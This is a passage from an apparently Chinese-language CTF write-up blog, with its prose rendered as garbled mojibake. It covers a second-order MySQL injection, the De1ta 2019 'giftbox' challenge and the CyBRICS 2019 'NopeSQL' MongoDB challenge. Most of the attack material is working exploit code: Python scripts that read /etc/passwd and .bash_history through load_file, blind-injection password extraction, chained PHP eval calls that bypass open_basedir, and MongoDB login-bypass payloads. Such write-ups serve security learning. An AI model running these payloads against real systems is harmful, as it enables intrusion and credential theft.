class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'comment'</span>:</span><br><span class="line">    $bo_id = addslashes($_POST[<span class="string">'bo_id'</span>]);</span><br><span class="line">    $sql = <span class="string">"select category from board where id='$bo_id'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    $num = mysql_num_rows($result);</span><br><span class="line">    <span class="keyword">if</span>($num&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    $category = mysql_fetch_array($result)[<span class="string">'category'</span>];</span><br><span class="line">    $content = addslashes($_POST[<span class="string">'content'</span>]);</span><br><span class="line">    $sql = <span class="string">"insert into comment</span></span><br><span class="line"><span class="string">            set category = '$category',</span></span><br><span class="line"><span class="string">                content = '$content',</span></span><br><span class="line"><span class="string">                bo_id = '$bo_id'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">"Location: ./comment.php?id=$bo_id"</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>categoryå˜é‡åœ¨æ’å…¥ä¹‹åå¦‚æœè§¦å‘äº†commentåŠŸèƒ½å°±ä¼šå†æ¬¡æå–å‡ºæ¥å¹¶ä¸åšä»»ä½•å¤„ç†é‡æ–°æ’å…¥æ–°çš„è¡¨ä¸­, é‚£ä¹ˆå¯ä»¥è€ƒè™‘äºŒæ¬¡æ³¨å…¥äº†(å‘ç°å¾ˆå¤šå’Œæ’å…¥ç›¸å…³çš„åŠŸèƒ½éƒ½å’ŒäºŒæ¬¡æ³¨å…¥ç›¸å…³)</p>
<p>ç„¶å</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$sql = &quot;insert into comment</span><br><span class="line">        set category = &apos;$category&apos;,</span><br><span class="line">            content = &apos;$content&apos;,</span><br><span class="line">            bo_id = &apos;$bo_id&apos;&quot;;</span><br></pre></td></tr></table></figure>
<p>è¿™ç§å¤šè¡Œçš„å°±å¯ä»¥é¿å…æ³¨é‡Šç¬¦å·ç ´åæ•´ä½“ç»“æ„.äºæ˜¯exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://10a319be-9667-4c10-94ca-bdc272ca247f.node3.buuoj.cn"</span></span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ran_str</span><span class="params">()</span>:</span></span><br><span class="line">    string = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        string += chr(random.randint(ord(<span class="string">'A'</span>), ord(<span class="string">'Z'</span>)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">"username"</span>: <span class="string">"zhangwei"</span>,</span><br><span class="line">        <span class="string">"password"</span>: <span class="string">"zhangwei666"</span></span><br><span class="line">    &#125;</span><br><span class="line">    s.post(url + <span class="string">"/login.php"</span>, data=data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(payload)</span>:</span></span><br><span class="line">    ran_string = ran_str()</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'title'</span>: ran_string,</span><br><span class="line">        <span class="string">'category'</span>: <span class="string">"',content=("</span>+payload+<span class="string">"),/*"</span>,</span><br><span class="line">        <span class="string">'content'</span>: <span class="string">'1'</span></span><br><span class="line">    &#125;</span><br><span class="line">    s.post(url + <span class="string">"/write_do.php?do=write"</span>, data=data)</span><br><span class="line">    <span class="keyword">return</span> ran_string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">comment</span><span class="params">(id)</span>:</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'content'</span>: <span class="string">"*/#"</span>,</span><br><span class="line">        <span class="string">'bo_id'</span>: id</span><br><span class="line">    &#125;</span><br><span class="line">    s.post(url + <span class="string">"/write_do.php?do=comment"</span>, data=data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># è¯»å–ç”¨æˆ·</span></span><br><span class="line">    <span class="comment">#  payload = "select (load_file('/etc/passwd'))"</span></span><br><span class="line">    <span class="comment"># è¯»å–ç”¨æˆ·ç›®å½•ä¸‹çš„æ“ä½œå†å²</span></span><br><span class="line">    <span class="comment"># payload = "select (load_file('/home/www/.bash_history'))"</span></span><br><span class="line">    <span class="comment"># ä»æ“ä½œå†å²ä¸­çŸ¥é“äº†è¿™ä¹ˆä¸ªæ–‡ä»¶</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># payload = "select (load_file('/tmp/html/.DS_Store'))"</span></span><br><span class="line">    <span class="comment">#  payload = "select (load_file('/var/www/html/flag_8946e1ff1ee3e40f.php'))"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    login()</span><br><span class="line">    ran_string = write(payload)</span><br><span class="line">    result = re.search(<span class="string">"&lt;tr&gt;&lt;td&gt;.*&lt;/td&gt;&lt;td class='AutoNewline'&gt;.*&lt;/td&gt;&lt;td class='AutoNewline'&gt;"</span>+ran_string+<span class="string">"&lt;/td&gt;"</span>, s.get(url).text)</span><br><span class="line">    id = str(result.group(<span class="number">0</span>).split(<span class="string">'&lt;/td&gt;'</span>)[<span class="number">0</span>][<span class="number">8</span>:])</span><br><span class="line">    comment(id)</span><br><span class="line">    result = re.split(<span class="string">"&lt;p&gt;"</span>, s.get(url + <span class="string">"/comment.php?id="</span> + str(id)).text)[<span class="number">2</span>]</span><br><span class="line">    content = result[:result.index(<span class="string">'&lt;/p&gt;'</span>)]</span><br><span class="line">    print(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h2 id="De1ta-ctf-2019-giftbox">De1ta ctf 2019 giftbox</h2>
<p>æ‰“å¼€åæ˜¯ä¸€ä¸ªæ¼‚äº®çš„æ²™ç›’</p>
<p><img src="https://user-images.githubusercontent.com/40637063/70123884-86ce2980-16ae-11ea-83e0-367a142a00ad.png" alt="image"></p>
<p>æ‰“å¼€main.jsåæç¤ºä½¿ç”¨pyotpåº“, æ˜¯ä¸€ä¸ªä¸€æ¬¡ä¸€å¯†çš„çš„ä¸œè¥¿, è¿˜ç»™äº†åˆå§‹åŒ–çš„å¯†é’¥, ç„¶ååˆå§‹åŒ–pyotpç±»ä¹‹åé€šè¿‡æ—¶é—´äº§ç”Ÿå¯†é’¥.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">       url: host + &apos;/shell.php?a=&apos;+encodeURIComponent(input)+&apos;&amp;totp=&apos; + new TOTP(&quot;GAXG24JTMZXGKZBU&quot;,8).genOTP(),</span><br><span class="line">       type: &quot;GET&quot;,</span><br><span class="line">       dataType: &apos;json&apos;,</span><br><span class="line">       success: (res) =&gt; &#123;</span><br><span class="line">           e_main.html($(&apos;#main&apos;).html() + &apos;[&lt;span id=&quot;usr&quot;&gt;&apos; + usrName + &apos;&lt;/span&gt;@&lt;span class=&quot;host&quot;&gt;de1ta-mbp&lt;/span&gt; &apos; + position + &apos;]% &apos; + input + &apos;&lt;br/&gt;&apos; + res.message + &apos;&lt;br/&gt;&apos;)</span><br><span class="line">           if (e_console.height()-$(window).height()&gt;0)&#123;e_console.css(&apos;top&apos;,-(e_console.height()-$(window).height()));&#125;else&#123;e_console.css(&apos;top&apos;,5);&#125;</span><br><span class="line">       &#125;,</span><br><span class="line">       error: (res) =&gt; &#123;</span><br><span class="line">           e_main.html($(&apos;#main&apos;).html() + &apos;[&lt;span id=&quot;usr&quot;&gt;&apos; + usrName + &apos;&lt;/span&gt;@&lt;span class=&quot;host&quot;&gt;de1ta-mbp&lt;/span&gt; &apos; + position + &apos;]% &apos; + input + &apos;&lt;br/&gt;System Fatal Error!&lt;br/&gt;&apos;)</span><br><span class="line">           if (e_console.height()-$(window).height()&gt;0)&#123;e_console.css(&apos;top&apos;,-(e_console.height()-$(window).height()));&#125;else&#123;e_console.css(&apos;top&apos;,5);&#125;</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;)</span><br></pre></td></tr></table></figure>
<p>ç™»å½•å¤„æ³¨å…¥è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> pyotp</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://6902525d-08c5-4464-9537-eec6f904fc0a.node3.buuoj.cn/shell.php?a=%s&amp;totp=%s'</span></span><br><span class="line">totp = pyotp.TOTP(<span class="string">"GAXG24JTMZXGKZBU"</span>, digits=<span class="number">8</span>, interval=<span class="number">5</span>)</span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line">length = <span class="number">0</span></span><br><span class="line">left = <span class="number">0x0</span></span><br><span class="line">right = <span class="number">0xff</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    mid = int((right - left) / <span class="number">2</span> + left)</span><br><span class="line">    <span class="keyword">if</span> mid == left:</span><br><span class="line">        length = mid</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    username = <span class="string">"'/**/or/**/if(length((select/**/password/**/from/**/users/**/limit/**/1))&gt;=%d,1,0)#"</span> % mid</span><br><span class="line">    password = <span class="string">"b"</span></span><br><span class="line">    payload = <span class="string">'login %s %s'</span> % (username, password)</span><br><span class="line">    payload = urllib.quote(payload)</span><br><span class="line">    payload = url % (payload, totp.now())</span><br><span class="line">    res = s.get(payload).text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'incorrect'</span> <span class="keyword">in</span> res:</span><br><span class="line">        left = mid</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        right = mid</span><br><span class="line">print(length)</span><br><span class="line"></span><br><span class="line">real_password = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, length+<span class="number">1</span>):</span><br><span class="line">    left = <span class="number">0x20</span></span><br><span class="line">    right = <span class="number">0x7e</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        mid = int((right - left) / <span class="number">2</span> + left)</span><br><span class="line">        <span class="keyword">if</span> mid == left:</span><br><span class="line">            real_password += chr(mid)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        username = <span class="string">"'/**/or/**/if(ascii(substr((select/**/password/**/from/**/users/**/limit/**/1),%d,1))&gt;=%d,1,0)#"</span> % (i, mid)</span><br><span class="line">        password = <span class="string">"b"</span></span><br><span class="line">        payload = <span class="string">'login %s %s'</span> % (username, password)</span><br><span class="line">        payload = urllib.quote(payload)</span><br><span class="line">        payload = url % (payload, totp.now())</span><br><span class="line">        res = s.get(payload).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'incorrect'</span> <span class="keyword">in</span> res:</span><br><span class="line">            left = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = mid</span><br><span class="line">    print(real_password)</span><br><span class="line">    <span class="keyword">if</span> len(real_password) &lt; i:</span><br><span class="line">        print(<span class="string">'No.%d char not in range'</span> % i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°äº†<code>hint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333}</code></p>
<p>ç„¶å<code>login admin hint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333} </code>æ¥ç™»å½•ç”¨æˆ·, å¹¶ä¸”è¿™é‡Œæç¤ºäº†ä¸€ä¸ªå‘½ä»¤, æ‰§è¡Œä¸€ä¸‹sh0w_hiiintttt_23333 åæç¤º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">we add an evil monster named &apos;eval&apos; when launching missiles.</span><br></pre></td></tr></table></figure>
<p>å…¶å®æ˜¯åœ¨æç¤ºphpçš„åŠ¨æ€æ‰§è¡Œç‰¹æ€§</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> pyotp</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://6902525d-08c5-4464-9537-eec6f904fc0a.node3.buuoj.cn/shell.php?a=%s&amp;totp=%s'</span></span><br><span class="line">totp = pyotp.TOTP(<span class="string">"GAXG24JTMZXGKZBU"</span>, digits=<span class="number">8</span>, interval=<span class="number">5</span>)</span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(password)</span>:</span></span><br><span class="line">    username = <span class="string">'admin'</span></span><br><span class="line">    payload = <span class="string">'login %s %s'</span> % (username, password)</span><br><span class="line">    payload = urllib.quote(payload)</span><br><span class="line">    payload = url % (payload, totp.now())</span><br><span class="line">    s.get(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">destruct</span><span class="params">()</span>:</span></span><br><span class="line">    payload = <span class="string">'destruct'</span></span><br><span class="line">    payload = urllib.quote(payload)</span><br><span class="line">    payload = url % (payload, totp.now())</span><br><span class="line">    s.get(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">targeting</span><span class="params">(code, position)</span>:</span></span><br><span class="line">    payload = <span class="string">'targeting %s %s'</span> % (code, position)</span><br><span class="line">    payload = urllib.quote(payload)</span><br><span class="line">    payload = url % (payload, totp.now())</span><br><span class="line">    s.get(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">launch</span><span class="params">()</span>:</span></span><br><span class="line">    payload = <span class="string">'launch'</span></span><br><span class="line">    payload = urllib.quote(payload)</span><br><span class="line">    payload = url % (payload, totp.now())</span><br><span class="line">    <span class="keyword">return</span> s.get(payload).text</span><br><span class="line"></span><br><span class="line">login(<span class="string">'hint&#123;G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333&#125;'</span>)</span><br><span class="line">destruct()</span><br><span class="line">targeting(<span class="string">'a'</span>,<span class="string">'chr'</span>)</span><br><span class="line">targeting(<span class="string">'b'</span>,<span class="string">'&#123;$a(46)&#125;'</span>)</span><br><span class="line">targeting(<span class="string">'c'</span>,<span class="string">'&#123;$b&#125;&#123;$b&#125;'</span>)</span><br><span class="line">targeting(<span class="string">'d'</span>,<span class="string">'&#123;$a(47)&#125;'</span>)</span><br><span class="line">targeting(<span class="string">'e'</span>,<span class="string">'js'</span>)</span><br><span class="line">targeting(<span class="string">'f'</span>,<span class="string">'open_basedir'</span>)</span><br><span class="line">targeting(<span class="string">'g'</span>,<span class="string">'chdir'</span>)</span><br><span class="line">targeting(<span class="string">'h'</span>,<span class="string">'ini_set'</span>)</span><br><span class="line">targeting(<span class="string">'i'</span>,<span class="string">'file_get_'</span>)</span><br><span class="line">targeting(<span class="string">'j'</span>,<span class="string">'&#123;$i&#125;contents'</span>)</span><br><span class="line">targeting(<span class="string">'k'</span>,<span class="string">'&#123;$g($e)&#125;'</span>)</span><br><span class="line">targeting(<span class="string">'l'</span>,<span class="string">'&#123;$h($f,$c)&#125;'</span>)</span><br><span class="line">targeting(<span class="string">'m'</span>,<span class="string">'&#123;$g($c)&#125;'</span>)</span><br><span class="line">targeting(<span class="string">'n'</span>,<span class="string">'&#123;$h($f,$d)&#125;'</span>)</span><br><span class="line">targeting(<span class="string">'o'</span>,<span class="string">'&#123;$d&#125;flag'</span>)</span><br><span class="line">targeting(<span class="string">'p'</span>,<span class="string">'&#123;$j($o)&#125;'</span>)</span><br><span class="line">targeting(<span class="string">'q'</span>,<span class="string">'printf'</span>)</span><br><span class="line">targeting(<span class="string">'r'</span>,<span class="string">'&#123;$q($p)&#125;'</span>)</span><br><span class="line">print(launch())</span><br></pre></td></tr></table></figure>
<h2 id="CyBRICS-CTF-2019-NopeSQL">CyBRICS CTF 2019 NopeSQL</h2>
<blockquote>
<p>è¿™é“é¢˜è€ƒå¯Ÿmongodbæ³¨å…¥,å­¦åˆ°å¾ˆå¤š,å¤ç°çš„æ—¶å€™ç”±äºä¸ä¼šæ­å»ºç¯å¢ƒå¯¼è‡´éƒ½æ˜¯çœ‹ç€payloadå’Œæ–‡æ¡£æ¥æƒ³è±¡è§£æè¿‡ç¨‹çš„.å¾ˆæ˜¯èœé¸¡.</p>
</blockquote>
<p>å¼€å±€çš„ç•Œé¢,çœ‹èµ·æ¥é‚£ä¸ªæ˜¯ç™»å½•ç”¨çš„æ¡†æ¡†,ä¸‹é¢çš„æ–°é—»ä¼°è®¡æ˜¯éšæœºç”Ÿæˆçš„ä¸çŸ¥é“å•¥æ„æ€.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61634032-fd035e00-acc2-11e9-8eaf-a6ff3a9fb412.png" alt="image"></p>
<p>é¦–å…ˆå‘ç°<code>.git</code>æºç æ³„éœ²,å¦‚ä¸‹æ‰€ç¤º:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">"/vendor/autoload.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">    $collection = (<span class="keyword">new</span> MongoDB\Client(<span class="string">'mongodb://localhost:27017/'</span>))-&gt;test-&gt;users;</span><br><span class="line">    $raw_query = <span class="string">'&#123;"username": "'</span>.$username.<span class="string">'", "password": "'</span>.$password.<span class="string">'"&#125;'</span>;</span><br><span class="line">    $document = $collection-&gt;findOne(json_decode($raw_query));</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($document) &amp;&amp; <span class="keyword">isset</span>($document-&gt;password)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user = <span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_COOKIE[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    $user = auth($_COOKIE[<span class="string">'username'</span>], $_COOKIE[<span class="string">'password'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    $user = auth($_POST[<span class="string">'username'</span>], $_POST[<span class="string">'password'</span>]);</span><br><span class="line">    <span class="keyword">if</span> ($user) &#123;</span><br><span class="line">        setcookie(<span class="string">'username'</span>, $_POST[<span class="string">'username'</span>]);</span><br><span class="line">        setcookie(<span class="string">'password'</span>, $_POST[<span class="string">'password'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> ($user == <span class="keyword">true</span>): <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    Welcome!</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        Group most common news by</span><br><span class="line">        &lt;a href=<span class="string">"?filter=$category"</span>&gt;category&lt;/a&gt; | </span><br><span class="line">        &lt;a href=<span class="string">"?filter=$public"</span>&gt;publicity&lt;/a&gt;&lt;br&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">        $filter = $_GET[<span class="string">'filter'</span>];</span><br><span class="line"></span><br><span class="line">        $collection = (<span class="keyword">new</span> MongoDB\Client(<span class="string">'mongodb://localhost:27017/'</span>))-&gt;test-&gt;news;</span><br><span class="line"></span><br><span class="line">        $pipeline = [</span><br><span class="line">            [<span class="string">'$group'</span> =&gt; [<span class="string">'_id'</span> =&gt; <span class="string">'$category'</span>, <span class="string">'count'</span> =&gt; [<span class="string">'$sum'</span> =&gt; <span class="number">1</span>]]],</span><br><span class="line">            [<span class="string">'$sort'</span> =&gt; [<span class="string">'count'</span> =&gt; <span class="number">-1</span>]],</span><br><span class="line">            [<span class="string">'$limit'</span> =&gt; <span class="number">5</span>],</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        $filters = [</span><br><span class="line">            [<span class="string">'$project'</span> =&gt; [<span class="string">'category'</span> =&gt; $filter]]</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        $cursor = $collection-&gt;aggregate(array_merge($filters, $pipeline));</span><br><span class="line">	</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($filter)): <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="meta">&lt;?php</span></span><br><span class="line">            <span class="keyword">foreach</span> ($cursor <span class="keyword">as</span> $category) &#123;</span><br><span class="line">                    printf(<span class="string">"%s has %d news&lt;br&gt;"</span>, $category[<span class="string">'_id'</span>], $category[<span class="string">'count'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="meta">?&gt;</span></span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])): <span class="meta">?&gt;</span></span><br><span class="line">        Invalid username <span class="keyword">or</span> password</span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    &lt;form action=<span class="string">'/'</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">"text"</span> name=<span class="string">"username"</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">"password"</span> name=<span class="string">"password"</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">"submit"</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">    &lt;h2&gt;News&lt;/h2&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">        $collection = (<span class="keyword">new</span> MongoDB\Client(<span class="string">'mongodb://localhost:27017/'</span>))-&gt;test-&gt;news;</span><br><span class="line">        $cursor = $collection-&gt;find([<span class="string">'public'</span> =&gt; <span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">foreach</span> ($cursor <span class="keyword">as</span> $news) &#123;</span><br><span class="line">            printf(<span class="string">"%s&lt;br&gt;"</span>, $news[<span class="string">'title'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹å‡ºæ¥è¿™æ˜¯ä¸€ä¸ªmongodbçš„æ³¨å…¥é¢˜ç›®,é—®é¢˜åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†,é¦–å…ˆæ˜¯ç™»å½•,è¿™ä¸ªå¥½åŠ,æ¯”èµ›çš„æ—¶å€™æ˜¯æ„é€ ä¸‹é¢çš„è½½è·æ¥ç™»å½•çš„(ç°åœ¨å›å¤´ä¸€çœ‹å¥½å¤šå†—ä½™.æ¯”èµ›çš„æ—¶å€™è„‘å­ä¸å¼€çªå•Šâ€¦orz)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username=&quot;,&quot;username&quot;:&#123;&quot;any&quot;:&quot;</span><br><span class="line">password=&quot;&#125;,&quot;password&quot;:&#123;&quot;$ne&quot;:&quot;dd&quot;&#125;,&quot;username&quot;:&quot;admin</span><br></pre></td></tr></table></figure>
<p>çœ‹ä¸€çœ‹å¤§ä½¬çš„</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ç”¨æˆ·åï¼šéšä¾¿</span><br><span class="line">å¯†ç ï¼š&quot;,&quot;password&quot;:&#123;&quot;$ne&quot;: null&#125;,&quot;username&quot;:&quot;admin</span><br></pre></td></tr></table></figure>
<p>ç„¶åç•Œé¢å°±æ˜¯è¿™æ ·çš„äº†:</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61634710-7b143480-acc4-11e9-8a71-2458db059585.png" alt="image"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/61634735-89fae700-acc4-11e9-930c-0c990671b453.png" alt="image"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/61634744-91ba8b80-acc4-11e9-88ff-60e14a675ad0.png" alt="image"></p>
<p>çœ‹èµ·æ¥è¿™é‡Œæ˜¯åˆ†åˆ«æ ¹æ®ç±»å‹å’Œæ˜¯å¦å…¬å¼€ä¸¤ä¸ªæ ‡å‡†æ¥å‘ˆç°æ–°é—»æ¡ç›®çš„ç»Ÿè®¡æƒ…å†µçš„.è€Œä¸”å¼€å±€ç•Œé¢çš„é‚£äº›æ–°é—»éƒ½ç­›é€‰å‡ºæ¥çš„å…¬å¼€çš„æ–°é—»,æ ¹æ®æºç ä¹Ÿå¯ä»¥çœ‹å‡ºfilteræ˜¯æ³¨å…¥ç‚¹(æ¯•ç«Ÿä¸ä¼šæ— ç¼˜æ— æ•…ç»™ä½ ä¸€ä¸ªåŠŸèƒ½çš„å˜›).</p>
<p>ç„¶åä¸ä¼šmongodbâ€¦èµ›åçœ‹payloadå¦‚ä¸‹:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/index.php?filter[$cond][if][$eq][][$strLenBytes]=$title&amp;filter[$cond][if][$eq][][$toInt]=19&amp;filter[$cond][then]=$text&amp;filter[$cond][else]=12</span><br></pre></td></tr></table></figure>
<p>åˆ†æä¸€ä¸‹</p>
<p>è¿™é‡Œçš„ç»“æ„è§£æå‡ºæ¥åˆ°ä»£ç ä¸­å°±ç±»ä¼¼äº</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&quot;project&quot;]=&gt; array(1) &#123; </span><br><span class="line">    [&quot;category&quot;]=&gt; array(1) &#123;</span><br><span class="line">	[&quot;$cond&quot;]=&gt; array(3) &#123;</span><br><span class="line">	    [&quot;if&quot;]=&gt; array(1) &#123;</span><br><span class="line">		[&quot;$eq&quot;]=&gt; array(2) &#123;</span><br><span class="line">		    [0]=&gt; array(1) &#123; [&quot;$strLenBytes&quot;]=&gt; string(6) &quot;$title&quot; &#125; </span><br><span class="line">		    [1]=&gt; array(1) &#123; [&quot;$toInt&quot;]=&gt; string(2) &quot;19&quot; &#125; </span><br><span class="line">		&#125; </span><br><span class="line">	    &#125; </span><br><span class="line">	    [&quot;then&quot;]=&gt; string(5) &quot;$text&quot; </span><br><span class="line">	    [&quot;else&quot;]=&gt; string(2) &quot;12&quot; </span><br><span class="line">	&#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç»“åˆä»£ç æ¥çœ‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$pipeline = [</span><br><span class="line">    [&apos;$group&apos; =&gt; [&apos;_id&apos; =&gt; &apos;$category&apos;, &apos;count&apos; =&gt; [&apos;$sum&apos; =&gt; 1]]],</span><br><span class="line">    [&apos;$sort&apos; =&gt; [&apos;count&apos; =&gt; -1]],</span><br><span class="line">    [&apos;$limit&apos; =&gt; 5],</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">$filters = [</span><br><span class="line">    [&apos;$project&apos; =&gt; [&apos;category&apos; =&gt; $filter]]</span><br><span class="line">];</span><br></pre></td></tr></table></figure>
